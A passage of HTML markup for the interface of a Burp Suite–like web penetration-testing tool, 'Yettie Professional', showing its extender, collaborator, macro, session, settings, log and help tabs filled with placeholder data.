                                <div class="tab" data-extender-tab="bapp">BApp Store</div>
                                <div class="tab" data-extender-tab="settings">Settings</div>
                            </div>

                            <div class="tab-content active" id="extenderLoaded">
                                <div class="request-list">
                                    <!-- Extensions will be listed here -->
                                    <div class="request-item">
                                        <div class="request-details">
                                            <div class="request-url">Logger++</div>
                                            <div class="request-meta">
                                                <span>Version: 2.1.0</span>
                                                <span>Author: Core Security</span>
                                                <span>Status: Loaded</span>
                                            </div>
                                        </div>
                                        <div class="request-actions">
                                            <button class="btn btn-icon btn-sm btn-secondary" title="Configure">
                                                <i class="fas fa-cog"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-danger" title="Unload">
                                                <i class="fas fa-times"></i>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="request-item">
                                        <div class="request-details">
                                            <div class="request-url">Autorize</div>
                                            <div class="request-meta">
                                                <span>Version: 3.0.0</span>
                                                <span>Author: Barak Tawily</span>
                                                <span>Status: Loaded</span>
                                            </div>
                                        </div>
                                        <div class="request-actions">
                                            <button class="btn btn-icon btn-sm btn-secondary" title="Configure">
                                                <i class="fas fa-cog"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-danger" title="Unload">
                                                <i class="fas fa-times"></i>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="extenderBapp">
                                <div class="empty-state">
                                    <i class="fas fa-store"></i>
                                    <h3>BApp Store Unavailable</h3>
                                    <p>Connect to the internet to browse extensions</p>
                                    <button class="btn btn-primary" id="retryBappBtn">
                                        <i class="fas fa-redo" style="font-size: 14px;justify-content: center;display: inline-flex;align-items: center;"></i> Retry Connection
                                    </button>
                                </div>
                            </div>

                            <div class="tab-content" id="extenderSettings">
                                <div class="form-group">
                                    <label class="form-label">Extension API Port</label>
                                    <input type="number" class="form-control" id="apiPort" value="8082">
                                </div>
                                <div class="form-group">
                                    <label class="form-label">Extension Directory</label>
                                    <input type="text" class="form-control" id="extensionDir" value="./extensions">
                                </div>
                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="autoUpdate" checked>
                                        <label class="form-check-label" for="autoUpdate">Automatically check for updates</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="loadOnStartup" checked>
                                        <label class="form-check-label" for="loadOnStartup">Load extensions on startup</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="enableBeta">
                                        <label class="form-check-label" for="enableBeta">Enable beta extensions</label>
                                    </div>
                                </div>
                                <button class="btn btn-primary" id="saveExtenderSettings">
                                    <i class="fas fa-save"></i> Save Settings
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Collaborator Tab -->
                <div class="tab-content" id="collaboratorTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-satellite"></i>
                                Collaborator
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-success" id="startCollaboratorBtn">
                                    <i class="fas fa-play"></i> Start Server
                                </button>
                                <button class="btn btn-sm btn-danger" id="stopCollaboratorBtn" disabled>
                                    <i class="fas fa-stop"></i> Stop Server
                                </button>
                                <button class="btn btn-sm btn-primary" id="pollCollaboratorBtn" disabled>
                                    <i class="fas fa-sync"></i> Poll Now
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-collaborator-tab="server">Server</div>
                                <div class="tab" data-collaborator-tab="payloads">Payloads</div>
                                <div class="tab" data-collaborator-tab="interactions">Interactions</div>
                            </div>

                            <div class="tab-content active" id="collaboratorServer">
                                <div class="form-group">
                                    <label class="form-label">Server Status</label>
                                    <div class="d-flex align-items-center gap-2">
                                        <div class="status-badge danger" id="collaboratorStatus">
                                            <i class="fas fa-circle"></i>
                                            <span>Stopped</span>
                                        </div>
                                        <span class="text-muted" id="serverUptime">-</span>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Server Configuration</label>
                                    <div class="row" style="display: flex; gap: var(--spacing-lg);">
                                        <div class="col" style="flex: 1;">
                                            <label class="form-label">DNS Hostname</label>
                                            <input type="text" class="form-control" id="dnsHostname" placeholder="collaborator.example.com">
                                        </div>
                                        <div class="col" style="flex: 1;">
                                            <label class="form-label">HTTP(S) Hostname</label>
                                            <input type="text" class="form-control" id="httpHostname" placeholder="collaborator.example.com">
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Polling Interval</label>
                                    <select class="form-control form-select" id="pollInterval">
                                        <option value="10">10 seconds</option>
                                        <option value="30">30 seconds</option>
                                        <option value="60" selected>1 minute</option>
                                        <option value="300">5 minutes</option>
                                        <option value="600">10 minutes</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="enableDNS" checked>
                                        <label class="form-check-label" for="enableDNS">Enable DNS</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="enableHTTP" checked>
                                        <label class="form-check-label" for="enableHTTP">Enable HTTP/HTTPS</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="enableSMTP">
                                        <label class="form-check-label" for="enableSMTP">Enable SMTP</label>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="collaboratorPayloads">
                                <div class="form-group">
                                    <label class="form-label">Payload Types</label>
                                    <select class="form-control form-select" id="payloadTypeSelect">
                                        <option value="dns">DNS</option>
                                        <option value="http">HTTP</option>
                                        <option value="https">HTTPS</option>
                                        <option value="smtp">SMTP</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Generated Payload</label>
                                    <textarea class="form-control form-textarea" id="generatedPayload" rows="5" readonly></textarea>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Payload Options</label>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="includeSubdomain">
                                        <label class="form-check-label" for="includeSubdomain">Include unique subdomain</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="randomizePath">
                                        <label class="form-check-label" for="randomizePath">Randomize URL path</label>
                                    </div>
                                </div>

                                <button class="btn btn-primary" id="generatePayloadBtn">
                                    <i class="fas fa-bolt"></i> Generate Payload
                                </button>
                                <button class="btn btn-secondary" id="copyPayloadBtn">
                                    <i class="fas fa-copy"></i> Copy Payload
                                </button>
                            </div>

                            <div class="tab-content" id="collaboratorInteractions">
                                <div class="empty-state">
                                    <i class="fas fa-exchange-alt"></i>
                                    <h3>No Interactions</h3>
                                    <p>Start the server and use generated payloads to capture interactions</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Projects Tab -->
                <div class="tab-content" id="projectsTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-folder"></i>
                                Project Management
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-primary" id="newProjectBtn">
                                    <i class="fas fa-plus"></i> New Project
                                </button>
                                <button class="btn btn-sm btn-secondary" id="openProjectBtn">
                                    <i class="fas fa-folder-open"></i> Open Project
                                </button>
                                <button class="btn btn-sm btn-success" id="saveProjectBtn">
                                    <i class="fas fa-save"></i> Save Project
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="row" style="display: flex; gap: var(--spacing-lg);">
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Current Project</label>
                                        <input type="text" class="form-control" id="projectName" value="Untitled Project">
                                    </div>
                                    <div class="form-group">
                                        <label class="form-label">Project Description</label>
                                        <textarea class="form-control form-textarea" id="projectDescription" rows="4" placeholder="Enter project description..."></textarea>
                                    </div>
                                    <div class="form-group">
                                        <label class="form-label">Project File</label>
                                        <input type="text" class="form-control" id="projectFile" value="./projects/untitled.yetproj" readonly>
                                    </div>
                                </div>
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Recent Projects</label>
                                        <div class="request-list" style="max-height: 300px;">
                                            <div class="request-item">
                                                <div class="request-details">
                                                    <div class="request-url">Acme Corp Penetration Test</div>
                                                    <div class="request-meta">
                                                        <span>Modified: 2 hours ago</span>
                                                        <span>Size: 4.2 MB</span>
                                                    </div>
                                                </div>
                                                <div class="request-actions">
                                                    <button class="btn btn-icon btn-sm btn-secondary" title="Open">
                                                        <i class="fas fa-folder-open"></i>
                                                    </button>
                                                </div>
                                            </div>
                                            <div class="request-item">
                                                <div class="request-details">
                                                    <div class="request-url">Bank API Security Assessment</div>
                                                    <div class="request-meta">
                                                        <span>Modified: 1 day ago</span>
                                                        <span>Size: 12.7 MB</span>
                                                    </div>
                                                </div>
                                                <div class="request-actions">
                                                    <button class="btn btn-icon btn-sm btn-secondary" title="Open">
                                                        <i class="fas fa-folder-open"></i>
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group mt-4">
                                <label class="form-label">Project Options</label>
                                <div class="form-check">
                                    <input type="checkbox" class="form-check-input" id="autoSave" checked>
                                    <label class="form-check-label" for="autoSave">Auto-save project</label>
                                </div>
                                <div class="form-check">
                                    <input type="checkbox" class="form-check-input" id="createBackups" checked>
                                    <label class="form-check-label" for="createBackups">Create backup copies</label>
                                </div>
                                <div class="form-check">
                                    <input type="checkbox" class="form-check-input" id="compressProject">
                                    <label class="form-check-label" for="compressProject">Compress project file</label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Macros Tab -->
                <div class="tab-content" id="macrosTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-cogs"></i>
                                Macros
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-primary" id="newMacroBtn">
                                    <i class="fas fa-plus"></i> New Macro
                                </button>
                                <button class="btn btn-sm btn-success" id="runMacroBtn">
                                    <i class="fas fa-play"></i> Run Macro
                                </button>
                                <button class="btn btn-sm btn-secondary" id="recordMacroBtn">
                                    <i class="fas fa-record-vinyl"></i> Record
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-macro-tab="list">Macro List</div>
                                <div class="tab" data-macro-tab="editor">Macro Editor</div>
                                <div class="tab" data-macro-tab="settings">Settings</div>
                            </div>

                            <div class="tab-content active" id="macroList">
                                <div class="request-list">
                                    <div class="request-item">
                                        <div class="request-details">
                                            <div class="request-url">Login Sequence</div>
                                            <div class="request-meta">
                                                <span>Steps: 3</span>
                                                <span>Last run: 5 minutes ago</span>
                                                <span>Status: Ready</span>
                                            </div>
                                        </div>
                                        <div class="request-actions">
                                            <button class="btn btn-icon btn-sm btn-secondary" title="Edit">
                                                <i class="fas fa-edit"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-success" title="Run">
                                                <i class="fas fa-play"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-danger" title="Delete">
                                                <i class="fas fa-trash"></i>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="request-item">
                                        <div class="request-details">
                                            <div class="request-url">Extract Session Tokens</div>
                                            <div class="request-meta">
                                                <span>Steps: 2</span>
                                                <span>Last run: 1 hour ago</span>
                                                <span>Status: Ready</span>
                                            </div>
                                        </div>
                                        <div class="request-actions">
                                            <button class="btn btn-icon btn-sm btn-secondary" title="Edit">
                                                <i class="fas fa-edit"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-success" title="Run">
                                                <i class="fas fa-play"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-danger" title="Delete">
                                                <i class="fas fa-trash"></i>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="macroEditor">
                                <div class="form-group">
                                    <label class="form-label">Macro Name</label>
                                    <input type="text" class="form-control" id="macroName" placeholder="Enter macro name...">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Macro Steps</label>
                                    <div class="request-list" style="max-height: 300px;" id="macroSteps">
                                        <!-- Macro steps will be added here -->
                                        <div class="empty-state">
                                            <i class="fas fa-list"></i>
                                            <h3>No Steps Defined</h3>
                                            <p>Add requests to create a macro</p>
                                        </div>
                                    </div>
                                </div>

                                <div class="d-flex gap-2">
                                    <button class="btn btn-secondary" id="addStepBtn">
                                        <i class="fas fa-plus"></i> Add Step
                                    </button>
                                    <button class="btn btn-secondary" id="reorderStepsBtn">
                                        <i class="fas fa-sort"></i> Reorder
                                    </button>
                                    <button class="btn btn-danger" id="clearStepsBtn">
                                        <i class="fas fa-trash"></i> Clear All
                                    </button>
                                </div>
                            </div>

                            <div class="tab-content" id="macroSettings">
                                <div class="form-group">
                                    <label class="form-label">Execution Settings</label>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="stopOnError" checked>
                                        <label class="form-check-label" for="stopOnError">Stop on error</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="extractVariables">
                                        <label class="form-check-label" for="extractVariables">Extract variables from responses</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="useCookies" checked>
                                        <label class="form-check-label" for="useCookies">Use session cookies</label>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Delay Between Steps (ms)</label>
                                    <input type="number" class="form-control" id="stepDelay" value="1000" min="0" max="10000">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Maximum Retries</label>
                                    <input type="number" class="form-control" id="maxRetries" value="3" min="0" max="10">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Sessions Tab -->
                <div class="tab-content" id="sessionsTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-history"></i>
                                Session Management
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-secondary" id="refreshSessionsBtn">
                                    <i class="fas fa-sync"></i> Refresh
                                </button>
                                <button class="btn btn-sm btn-danger" id="clearSessionsBtn">
                                    <i class="fas fa-trash"></i> Clear All
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-session-tab="sessions">Active Sessions</div>
                                <div class="tab" data-session-tab="cookies">Cookies</div>
                                <div class="tab" data-session-tab="handlers">Session Handlers</div>
                            </div>

                            <div class="tab-content active" id="sessionSessions">
                                <div class="request-list">
                                    <div class="request-item">
                                        <div class="request-details">
                                            <div class="request-url">example.com</div>
                                            <div class="request-meta">
                                                <span>Created: 5 minutes ago</span>
                                                <span>Requests: 42</span>
                                                <span>Last activity: Just now</span>
                                            </div>
                                        </div>
                                        <div class="request-actions">
                                            <button class="btn btn-icon btn-sm btn-secondary" title="View">
                                                <i class="fas fa-eye"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-danger" title="Delete">
                                                <i class="fas fa-trash"></i>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="request-item">
                                        <div class="request-details">
                                            <div class="request-url">api.test.com</div>
                                            <div class="request-meta">
                                                <span>Created: 1 hour ago</span>
                                                <span>Requests: 128</span>
                                                <span>Last activity: 10 minutes ago</span>
                                            </div>
                                        </div>
                                        <div class="request-actions">
                                            <button class="btn btn-icon btn-sm btn-secondary" title="View">
                                                <i class="fas fa-eye"></i>
                                            </button>
                                            <button class="btn btn-icon btn-sm btn-danger" title="Delete">
                                                <i class="fas fa-trash"></i>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="sessionCookies">
                                <div class="form-group">
                                    <label class="form-label">Cookie Jar</label>
                                    <textarea class="form-control form-textarea" id="cookieJar" rows="10" readonly>
# Netscape HTTP Cookie File
.example.com	TRUE	/	FALSE	1735689600	session_id	abc123def456ghi789
.api.test.com	FALSE	/api	TRUE	1735776000	token	xyz789abc456def123
.test.com	TRUE	/admin	TRUE	1735862400	csrf_token	mno456pqr123stu789</textarea>
                                </div>
                                <div class="d-flex gap-2">
                                    <button class="btn btn-secondary" id="exportCookiesBtn">
                                        <i class="fas fa-download"></i> Export Cookies
                                    </button>
                                    <button class="btn btn-primary" id="importCookiesBtn">
                                        <i class="fas fa-upload"></i> Import Cookies
                                    </button>
                                    <button class="btn btn-danger" id="clearCookiesBtn">
                                        <i class="fas fa-trash"></i> Clear All Cookies
                                    </button>
                                </div>
                            </div>

                            <div class="tab-content" id="sessionHandlers">
                                <div class="form-group">
                                    <label class="form-label">Session Handler Rules</label>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="autoUpdateCookies" checked>
                                        <label class="form-check-label" for="autoUpdateCookies">Automatically update cookies from responses</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="storeSessions" checked>
                                        <label class="form-check-label" for="storeSessions">Store sessions between runs</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="promptSession">
                                        <label class="form-check-label" for="promptSession">Prompt for session selection</label>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Default Session Timeout (minutes)</label>
                                    <input type="number" class="form-control" id="sessionTimeout" value="30" min="1" max="1440">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Settings Tab -->
                <div class="tab-content" id="settingsTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-cog"></i>
                                Application Settings
                            </div>
                            <button class="btn btn-sm btn-primary" id="saveSettingsBtn">
                                <i class="fas fa-save"></i> Save Settings
                            </button>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-settings-tab="general">General</div>
                                <div class="tab" data-settings-tab="proxy">Proxy</div>
                                <div class="tab" data-settings-tab="network">Network</div>
                                <div class="tab" data-settings-tab="ui">User Interface</div>
                                <div class="tab" data-settings-tab="advanced">Advanced</div>
                            </div>

                            <div class="tab-content active" id="settingsGeneral">
                                <div class="form-group">
                                    <label class="form-label">Default Project Directory</label>
                                    <input type="text" class="form-control" id="projectDirectory" value="./projects">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Auto-save Interval (minutes)</label>
                                    <input type="number" class="form-control" id="autoSaveInterval" value="5" min="1" max="60">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Default File Format</label>
                                    <select class="form-control form-select" id="defaultFileFormat">
                                        <option value="yettie">Yettie (.yetproj)</option>
                                        <option value="json">JSON (.json)</option>
                                        <option value="xml">XML (.xml)</option>
                                        <option value="har">HTTP Archive (.har)</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="checkUpdates" checked>
                                        <label class="form-check-label" for="checkUpdates">Check for updates on startup</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="sendMetrics">
                                        <label class="form-check-label" for="sendMetrics">Send anonymous usage statistics</label>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="settingsProxy">
                                <div class="form-group">
                                    <label class="form-label">Proxy Listen Port</label>
                                    <input type="number" class="form-control" id="proxyPort" value="8080" min="1" max="65535">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Proxy Listen Address</label>
                                    <input type="text" class="form-control" id="proxyAddress" value="127.0.0.1">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Upstream Proxy</label>
                                    <div class="row" style="display: flex; gap: var(--spacing-lg);">
                                        <div class="col" style="flex: 1;">
                                            <input type="text" class="form-control" placeholder="Host" id="upstreamProxyHost">
                                        </div>
                                        <div class="col" style="flex: 1;">
                                            <input type="number" class="form-control" placeholder="Port" id="upstreamProxyPort">
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="proxySSL" checked>
                                        <label class="form-check-label" for="proxySSL">Support SSL interception</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="proxyCache">
                                        <label class="form-check-label" for="proxyCache">Cache responses</label>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="settingsNetwork">
                                <div class="form-group">
                                    <label class="form-label">Network Timeout (seconds)</label>
                                    <input type="number" class="form-control" id="networkTimeout" value="30" min="1" max="300">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Maximum Concurrent Requests</label>
                                    <input type="number" class="form-control" id="maxConcurrentRequests" value="10" min="1" max="100">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">User-Agent String</label>
                                    <input type="text" class="form-control" id="userAgent" value="Yettie/3.0">
                                </div>

                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="followRedirect" checked>
                                        <label class="form-check-label" for="followRedirect">Follow redirects automatically</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="verifySSL">
                                        <label class="form-check-label" for="verifySSL">Verify SSL certificates</label>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="settingsUI">
                                <div class="form-group">
                                    <label class="form-label">Theme</label>
                                    <select class="form-control form-select" id="uiTheme">
                                        <option value="light">Light</option>
                                        <option value="dark">Dark</option>
                                        <option value="system">System Default</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Font Size</label>
                                    <select class="form-control form-select" id="uiFontSize">
                                        <option value="small">Small</option>
                                        <option value="medium" selected>Medium</option>
                                        <option value="large">Large</option>
                                        <option value="xlarge">Extra Large</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Layout Density</label>
                                    <select class="form-control form-select" id="uiDensity">
                                        <option value="compact">Compact</option>
                                        <option value="normal" selected>Normal</option>
                                        <option value="comfortable">Comfortable</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="animations" checked>
                                        <label class="form-check-label" for="animations">Enable animations</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="tooltips" checked>
                                        <label class="form-check-label" for="tooltips">Show tooltips</label>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="settingsAdvanced">
                                <div class="form-group">
                                    <label class="form-label">Log Level</label>
                                    <select class="form-control form-select" id="logLevel">
                                        <option value="error">Error</option>
                                        <option value="warn">Warning</option>
                                        <option value="info" selected>Info</option>
                                        <option value="debug">Debug</option>
                                        <option value="trace">Trace</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Maximum Log Size (MB)</label>
                                    <input type="number" class="form-control" id="maxLogSize" value="100" min="1" max="1000">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Java Memory (MB)</label>
                                    <input type="number" class="form-control" id="javaMemory" value="2048" min="512" max="8192">
                                </div>

                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="enableDebug">
                                        <label class="form-check-label" for="enableDebug">Enable debug mode</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="experimentalFeatures">
                                        <label class="form-check-label" for="experimentalFeatures">Enable experimental features</label>
                                    </div>
                                </div>

                                <div class="alert alert-warning">
                                    <i class="fas fa-exclamation-triangle"></i>
                                    <strong>Warning:</strong> Changing advanced settings may affect application stability.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Logs Tab -->
                <div class="tab-content" id="logsTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-clipboard-list"></i>
                                Application Logs
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-secondary" id="refreshLogsBtn">
                                    <i class="fas fa-sync"></i> Refresh
                                </button>
                                <button class="btn btn-sm btn-primary" id="exportLogsBtn">
                                    <i class="fas fa-download"></i> Export
                                </button>
                                <button class="btn btn-sm btn-danger" id="clearLogsBtn">
                                    <i class="fas fa-trash"></i> Clear
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-log-tab="application">Application</div>
                                <div class="tab" data-log-tab="proxy">Proxy</div>
                                <div class="tab" data-log-tab="scanner">Scanner</div>
                                <div class="tab" data-log-tab="extensions">Extensions</div>
                            </div>

                            <div class="tab-content active" id="logApplication">
                                <div class="code-editor">
                                    <div class="code-content">
                                        <pre id="appLogContent">[2024-01-15 10:30:45] INFO: Application started
[2024-01-15 10:30:46] INFO: Loading configuration...
[2024-01-15 10:30:47] INFO: Proxy server started on 127.0.0.1:8080
[2024-01-15 10:31:15] INFO: New project created: "Untitled Project"
[2024-01-15 10:32:00] INFO: 5 requests captured via proxy</pre>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="logProxy">
                                <div class="code-editor">
                                    <div class="code-content">
                                        <pre id="proxyLogContent">[2024-01-15 10:31:01] INFO: Proxy listening on 127.0.0.1:8080
[2024-01-15 10:31:15] INFO: New client connected: 127.0.0.1:54321
[2024-01-15 10:31:20] INFO: GET / HTTP/1.1 -> example.com:80 (200 OK)
[2024-01-15 10:31:25] INFO: POST /login HTTP/1.1 -> example.com:80 (302 Found)
[2024-01-15 10:31:30] INFO: Client disconnected: 127.0.0.1:54321</pre>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="logScanner">
                                <div class="code-editor">
                                    <div class="code-content">
                                        <pre id="scannerLogContent">[2024-01-15 10:32:15] INFO: Starting vulnerability scan on example.com
[2024-01-15 10:32:20] INFO: Spidering target: Found 15 URLs
[2024-01-15 10:32:45] INFO: Testing for SQL injection vulnerabilities...
[2024-01-15 10:33:10] INFO: Testing for XSS vulnerabilities...
[2024-01-15 10:33:35] INFO: Scan completed: 2 issues found</pre>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="logExtensions">
                                <div class="code-editor">
                                    <div class="code-content">
                                        <pre id="extensionsLogContent">[2024-01-15 10:30:48] INFO: Loading extensions...
[2024-01-15 10:30:49] INFO: Extension loaded: Logger++ v2.1.0
[2024-01-15 10:30:50] INFO: Extension loaded: Autorize v3.0.0
[2024-01-15 10:31:00] INFO: All extensions loaded successfully</pre>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Help Tab -->
                <div class="tab-content" id="helpTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-question-circle"></i>
                                Help & Documentation
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-primary" id="documentationBtn">
                                    <i class="fas fa-book"></i> Documentation
                                </button>
                                <button class="btn btn-sm btn-secondary" id="tutorialsBtn">
                                    <i class="fas fa-graduation-cap"></i> Tutorials
                                </button>
                                <button class="btn btn-sm btn-success" id="supportBtn">
                                    <i class="fas fa-life-ring"></i> Support
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-help-tab="started">Getting Started</div>
                                <div class="tab" data-help-tab="tools">Tools Guide</div>
                                <div class="tab" data-help-tab="troubleshooting">Troubleshooting</div>
                                <div class="tab" data-help-tab="about">About</div>
                            </div>

                            <div class="tab-content active" id="helpStarted">
                                <h3>Welcome to Yettie Professional v3.0</h3>
                                <p>Yettie Professional is an advanced security testing platform designed for web application penetration testers and security researchers.</p>

                                <h4>Quick Start Guide:</h4>
                                <ol>
                                    <li><strong>Set your target:</strong> Go to the Target tab and configure your scope</li>
                                    <li><strong>Configure proxy:</strong> Set up your browser to use Yettie as a proxy (127.0.0.1:8080)</li>
                                    <li><strong>Start browsing:</strong> Browse your target application to capture requests</li>
                                    <li><strong>Analyze:</strong> Use the Scanner and other tools to identify vulnerabilities</li>
                                    <li><strong>Test:</strong> Use Repeater and Intruder to manually test findings</li>
                                </ol>

                                <h4>Key Features:</h4>
                                <ul>
                                    <li>Advanced web vulnerability scanner</li>
                                    <li>Powerful intruder for automated attacks</li>
                                    <li>Repeater for manual request manipulation</li>
                                    <li>Decoder for various encoding/decoding operations</li>
                                    <li>Collaborator for out-of-band testing</li>
                                    <li>Extensive extension support</li>
                                </ul>
                            </div>

                            <div class="tab-content" id="helpTools">
                                <h3>Tools Reference</h3>

                                <h4>Proxy</h4>
                                <p>Intercept and modify HTTP/HTTPS traffic between your browser and target applications.</p>

                                <h4>Scanner</h4>
                                <p>Automatically scan web applications for common vulnerabilities including SQL injection, XSS, CSRF, and more.</p>

                                <h4>Intruder</h4>
                                <p>Perform customized automated attacks to identify and exploit vulnerabilities.</p>

                                <h4>Repeater</h4>
                                <p>Manually edit and reissue individual HTTP requests.</p>

                                <h4>Decoder</h4>
                                <p>Encode and decode data using various algorithms and formats.</p>

                                <h4>Comparer</h4>
                                <p>Compare two pieces of data to identify differences.</p>

                                <h4>Collaborator</h4>
                                <p>Detect and exploit out-of-band vulnerabilities.</p>
                            </div>

                            <div class="tab-content" id="helpTroubleshooting">
                                <h3>Common Issues & Solutions</h3>

                                <h4>Proxy Not Working</h4>
                                <ul>
                                    <li>Verify Yettie is running and listening on the correct port (default: 8080)</li>
                                    <li>Check browser proxy settings are correctly configured</li>
                                    <li>Ensure no other application is using port 8080</li>
                                    <li>Try disabling SSL verification if HTTPS sites aren't loading</li>
                                </ul>

                                <h4>Scanner Not Finding Vulnerabilities</h4>
                                <ul>
                                    <li>Ensure you have proper authorization to test the target</li>
                                    <li>Check that the target is within the configured scope</li>
                                    <li>Try increasing scan depth and coverage</li>
                                    <li>Verify the application is actually vulnerable to tested issues</li>
                                </ul>

                                <h4>Application Crashes or Freezes</h4>
                                <ul>
                                    <li>Increase Java heap size in Advanced Settings</li>
                                    <li>Clear temporary files and restart</li>
                                    <li>Check available system memory</li>
                                    <li>Update to the latest version</li>
                                </ul>
                            </div>

                            <div class="tab-content" id="helpAbout">
                                <div class="text-center">
                                    <h3>Yettie Professional v3.0</h3>
                                    <p>Advanced Security Testing Platform</p>

